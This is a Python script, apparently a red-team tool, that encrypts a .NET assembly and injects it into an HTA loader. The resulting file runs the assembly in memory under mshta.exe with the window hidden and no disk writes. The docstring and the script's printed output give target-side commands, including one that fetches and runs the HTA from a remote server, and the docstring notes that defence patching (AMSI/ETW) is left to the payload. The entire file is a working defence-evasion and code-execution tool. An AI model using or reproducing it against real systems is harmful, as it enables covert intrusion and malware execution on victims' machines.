#!/usr/bin/env python3
"""
build_hta.py -- Encrypts a .NET assembly and injects into hta_payload.hta

Generates an .hta file that:
  - Bootstraps CLR via mscoree.CorRuntimeHost COM
  - AES-decrypts payload using .NET RijndaelManaged through COM interop
  - Loads assembly in-memory via AppDomain.Load_3(byte[])
  - Runs under mshta.exe (Microsoft-signed, no disk writes)
  - HTA window auto-hides and closes after execution

Note: Environmental keying not supported in HTA — use PowerShell cradle instead.
Note: AMSI/ETW bypass not in loader; loaded assembly handles patching in its constructor.

Usage:
  python build_hta.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_hta.py Seatbelt.exe -- -group=all
  python build_hta.py Seatbelt.exe -e xor -- -group=all

On target:
  mshta payload_ready.hta
  mshta http://<server>/payload_ready.hta
"""

import argparse
import base64
import os
import re
import sys

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def remove_block(template: str, start_marker: str, end_marker: str) -> str:
    pattern = re.compile(
        rf"^.*{re.escape(start_marker)}.*$\n(.*?\n)*?^.*{re.escape(end_marker)}.*$\n?",
        re.MULTILINE
    )
    return pattern.sub('', template)


def uncomment_block(template: str, start_marker: str, end_marker: str) -> str:
    lines = template.split('\n')
    in_block = False
    result = []
    for line in lines:
        if start_marker in line:
            in_block = True
            continue
        elif end_marker in line:
            in_block = False
            continue
        elif in_block:
            if line.startswith("    ' "):
                result.append("    " + line[6:])
            elif line.strip() == "'":
                result.append("")
            else:
                result.append(line)
        else:
            result.append(line)
    return '\n'.join(result)


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into hta_payload.hta"
    )
    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument("--key", help="Encryption key as hex")
    parser.add_argument("--iv", help="AES IV as hex (16 bytes / 32 hex chars)")
    parser.add_argument("-o", "--output", help="Output .hta file (default: payload_ready.hta)")
    parser.add_argument("--template", help="Template .hta file to use")
    args = parser.parse_args(argv)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "hta_payload.hta")
    output_path = args.output or os.path.join(script_dir, "output", "payload_ready.hta")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)
    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    # --- Encryption ---

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        template = remove_block(template, "' DECRYPT_AES_START", "' DECRYPT_AES_END")
        template = uncomment_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    else:
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(f"[-] AES-256 key must be 32 bytes, got {len(key)}", file=sys.stderr)
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(f"[-] AES IV must be 16 bytes, got {len(iv)}", file=sys.stderr)
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')

    print(f"[*] Encrypted payload: {len(base64.b64encode(encrypted).decode())} chars base64",
          file=sys.stderr)

    # --- Assembly args ---

    if assembly_args:
        args_str = ", ".join(f'"{a}"' for a in assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("Array(YOURARGS)", "Array()")

    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    mshta {os.path.basename(output_path)}", file=sys.stderr)


if __name__ == "__main__":
    main()
